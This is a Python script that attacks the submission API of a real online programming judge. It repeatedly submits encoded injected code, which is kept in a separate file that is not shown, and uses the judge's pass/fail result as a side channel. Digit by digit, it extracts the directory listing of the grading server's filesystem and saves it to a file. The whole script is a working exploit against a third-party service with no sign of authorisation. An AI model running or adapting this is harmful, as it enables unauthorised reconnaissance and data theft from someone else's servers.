import base64
import requests as req
import time
import threading

# script is in scriptInject.py
script_start = open("scriptInject.py", "r").read()
url = "https://training.olinfo.it" + "/api/submission"

headers = {
    'Content-Type': 'application/json;charset=UTF-8',
    'User-Agent': 'Valve Steam Gamepad' 
}
cookies = {
    'training_token': 'redacted'
}

def sendScript(script):
    data = '{"files":{"patrol2.%l":{"filename":"ace.py","language":"Python 3 / CPython","data":"' + script + '"}},"action":"new","task_name":"ois_patrol2"}'
    response = req.post(url, headers=headers, cookies=cookies, data=data)
    return response.json()

hexs = "0123456789abcdef"
# times = []

min_time = 5
freq_loader = 0.2
loading = ['|', '/', '-', '\\']
def infinity():
    i = 0
    while True:
        yield loading[i % len(loading)]
        i += 1
def loading_inf(runevent):
    for char in infinity():
        print('loading ' + char, end='\r')
        time.sleep(freq_loader)
        if runevent.is_set():
            break
def listdir(dir='.', hex_str='__'):
    hex_str = '__' + hex_str

    runevent = threading.Event()
    thread = threading.Thread(target=loading_inf, args=(runevent,))
    thread.start()
    try:
        while hex_str[-2:] != '00':
            for char in hexs:
                if char == '1' and len(hex_str) % 2 == 0:
                    # skip 1 at the beginning of a byte
                    continue

                # copy script and replace variables
                script = script_start.replace("0'#woo1", char + "'")
                script = script.replace('0#woo2', str(len(hex_str) - 2))
                script = script.replace(".'#woo3", dir + "'")
                script = base64.b64encode(script.encode()).decode()

                response = {
                    'success': 0
                }
                # wait the time limit
                while response['success'] == 0:
                    response = sendScript(script)

                id = response['id']
                data = '{"action":"details","id":"' + str(id) + '"}'
                response = {
                    'score_details': None
                }

                time.sleep(min_time)
                # start = time.time()
                # wait the execution results

                while response['score_details'] == None:
                    response = req.post(url, headers=headers, cookies=cookies, data=data).json()
                
                # times.append(time.time() - start)
                # print(min(times))

                if response['score_details'][0]['testcases'][0]['text'] == 'Execution failed because the return code was nonzero':
                    # found
                    hex_str += char
                    print(hex_str[2:] + ' '*10)
                    if len(hex_str) %2 == 0 and hex_str[-2:] != '00':
                        print(bytes.fromhex(hex_str[2:]).decode())
                    break
        runevent.set()
        output = bytes.fromhex(hex_str[2:-2]).decode()
        print(output)
        # write it on file
        with open(f"output{dir}.txt", "w") as f:
            f.write(output)
    except KeyboardInterrupt:
        # stop loading thread
        runevent.set()


    thread.join()

if __name__ == '__main__':
    listdir(dir='/')